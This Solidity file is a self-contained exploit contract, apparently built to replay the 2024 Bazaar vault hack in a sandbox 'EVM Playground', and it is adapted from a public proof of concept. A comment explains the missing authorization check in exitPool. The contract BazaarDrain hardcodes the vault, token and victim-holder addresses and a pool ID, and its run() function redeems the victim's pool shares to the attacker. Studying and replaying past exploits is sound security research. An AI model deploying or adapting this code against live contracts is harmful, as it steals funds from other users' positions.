// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-06-Bazaar).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract:
// `testExploit()` calls `vulnVault.exitPool(...)` directly from `address(this)`
// (the test contract itself is the attacker/recipient) — there is no standalone
// attack contract to deploy. This contract is a faithful, self-contained copy of
// that single call so the playground can deploy it and record run().
//
// Root cause: BazaarVault.exitPool(poolId, sender, recipient, request) burns
// `sender`'s pool shares (BPT) and pays the redeemed underlying to `recipient`,
// with NO authorization check that msg.sender == sender (or an approved
// relayer). Anyone can pass ANY other address as `sender` and redeem THEIR pool
// shares to themselves. Logic and constants are copied verbatim from
// test/Bazaar_exp.sol.

interface IBalancerVault {
    struct ExitPoolRequest {
        address[] asset;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function exitPool(
        bytes32 poolId,
        address sender,
        address payable recipient,
        ExitPoolRequest memory request
    ) external payable;
}

contract BazaarDrain {
    uint256 private constant MAX_ETH_OUT = 850_000_000 ether;

    address private constant WETH_ADDRESS = 0x4300000000000000000000000000000000000004;
    address private constant RYOLO_ADDRESS = 0x86cba7808127d76deaC14ec26eF6000Aa78b2eBb;
    address private constant VULN_VAULT_ADDRESS = 0xefb4e3Cc438eF2854727A7Df0d0baf844484EdaB;

    IBalancerVault private constant vulnVault = IBalancerVault(VULN_VAULT_ADDRESS);

    address private constant HOLDER_TO_TAKE_FROM = 0xb66585C4E460D49154D50325CE60aDC44bc900E9;
    bytes32 private constant TARGET_ID = 0xdc4a9779d6084c1ab3e815b67ed5e6780ccf4d90000200000000000000000001;

    receive() external payable {}

    function run() external {
        vulnVault.exitPool(TARGET_ID, HOLDER_TO_TAKE_FROM, payable(address(this)), buildExitPoolRequest());
    }

    function buildExitPoolRequest() private pure returns (IBalancerVault.ExitPoolRequest memory) {
        IBalancerVault.ExitPoolRequest memory request = IBalancerVault.ExitPoolRequest({
            asset: new address[](2),
            minAmountsOut: new uint256[](2),
            userData: abi.encode(uint256(1), MAX_ETH_OUT),
            toInternalBalance: false
        });
        request.asset[0] = WETH_ADDRESS;
        request.asset[1] = RYOLO_ADDRESS;
        request.minAmountsOut[0] = 0;
        request.minAmountsOut[1] = 0;
        return request;
    }
}
